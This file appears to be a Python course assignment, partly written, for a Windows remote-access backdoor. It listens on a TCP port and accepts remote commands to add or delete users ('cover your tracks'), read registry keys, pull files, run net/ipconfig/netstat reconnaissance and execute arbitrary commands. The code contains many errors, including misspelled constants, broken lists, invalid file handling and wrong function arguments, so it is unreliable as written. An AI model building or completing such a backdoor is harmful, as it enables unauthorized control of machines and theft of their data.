'''
This project is something of a nod to the other course I taught. You'll
be writing a python script to gather information from a host machine and
send it to a target server. We'll be using a bit of the code from our
previous project, which I included in this file already.

HINT: We're gonna use the crap out of the subprocess module in this

Your functions are as follows:
    create_user
        given a name, create a user
    
    delete_user
        get rid of a user, cover your tracks, or just to upset the owner
    
    download_registry_key
        given a root and a key path, send the value to the client
    
    download_file
        given a specific file name (we're not going to do a full drive 
        search, since you already wrote that code in another project),
        download it to the client
    
    gather_information
        - using Ipconfig and Netstat, learn what addresses this machine 
          owns, and what connections it has active
        - using the Net suite, gather the various pieces of intel 
          covered in previous courses, specifically:
			Accounts (Password and account policy data)
			File (Indicates shared files or folders which are in use)
			localgroup(list of groups on a machine)
			session(Display information about sessions on a machine)
			share (lists all shares from the machine)
			user (lists users)
			view (list known computers in the domain)
        
    execute_command
        execute an arbitrary command and send the results back to the 
        client
'''
import subprocess, socket, time, struct
from _winreg import *

def recv_data(sock):
    data_len, = struct.unpack("!I",sock.recv(4))
    return sock.recv(data_len)
    
def send_data(sock,data):
    data_len = len(data)
    sock.send(struct.pack("!I",data_len))
    sock.send(data)
    return

def create_user(name,pwd, log_file):
    cmd_list = ["net",
                "user",
                "/add",
                name,
                pwd]
    subprocess.Popen(cmd_list, 0 , None, None, log_file, log_file)
    log_file.close()
    with open(log_file, "r") as f:
        data = f.read()

    return data

def delete_user(name, log_file):
    cmd_list = ["net",
                "user",
                "/del",
                name]
    subprocess.Popen(cmd_list, 0, None, None, log_file, log_file)
    log_file.close()
    with(log_file, "r") as f:
        data = f.read()
    return data

def download_registry_key(root, path, sock):
	root_dict = {"HKEY_CLASSES_ROOT" : HKEYY_CLASSES_ROOT,
				 "HKEY_CURRENT_USER" : HKEYY_CURRENT_USER,
				 "HKEY_LOCAL_MACHINE" : HKEY_LOCAL_MACHINE,
				 "HKEY_USERS" : HKEY_USERS,
				 "HKEY_CURRENT_CONFIG": HKEY_CURRENT_CONFIG}

	root = root_dict[root]
	key_hdl = CreateKey(root, path)
	num_subkeys, num_values, l_modified = QueryInfoKey(key_hdl)
	send_data(sock, "SUBLEYS: %D\nVALUES: %d\n" % (num_subkeys, num_values))

	send_data(sock, print "=========================SUBKEYS=========================")
	for i in num_subkeys:
		send_data(sock, EnumKey(key_hdl, i))
	send_data(sock, "=========================VALUES=========================")
	for i in num_values:
		v_name, v_data, d_type = EnumValue(key_hdl, i)
		send_data(sock, "%s: %d: " % (v_name, v_data))
	send_data(sock, "DATA COMPLETE")
	return

def download_file(file_name,sock):
	with(file_name, "r") as f:
		print f.read()
	return
        
def gather_information(log_name,sock):
	cmd_list = [["ipconfig", "/all" ]
				["netstat"],
				["net", "accounts"]
				["net", "file"]
				["net", "localgroup"]
				["net", "session"]
				["net", "share"]
				["net", "user"]
				["net", "view"]]
	with open(log_name, "w") as f:
		for cmd in cmd_list:
			subprocess.Popen(cmd, 0, None, None, f, f)
	send_data(sock, "Log created" + f)
	return
    
def execute_command(cmd, log):
	with open(log, "w") as f:
		try:
			subprocess.Popen(cmd, 0, None, None, f, f)
		except WindowsError:
			subprocess.Popen(cmd+ ".com", 0, None, None, f, f)
	return
    
def get_data(sock, str_to_send):
	send_data(sock, str_to_send)
	return recv_data(sock)

def main():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(("", 55555))
	sock.listen(1)
	conn_sock, conn_info = sock.accept()
	with open("err.log", "w") as error_log:
		while True:
			cmd = get_data(conn_sock, "COMMAND: ")
			if cmd == "CU":
				create_user(get_data(conn_sock, "Username: "), get_data(conn_sock, "Password: "))

			elif cmd == "DU":
				delete_user(get_data(conn_sock, "Username: "), error_log)
			elif cmd == "DRK":
				download_registry_key(get_data(conn_sock, "Root"), get_data(conn_sock, "Path"), conn_sock)
			elif cmd == "DF":
				download_file(get_data(conn_sock, "Filename"), conn_sock)
			elif cmd == "GI":
				gather_information(get_data(conn_sock, "Log name: "), conn_sock)
			elif cmd == "EC":
				execute_command(get_data(conn_sock, "Command: "), get_data(conn_sock, "Log Name: "))

	return
    
main()
    
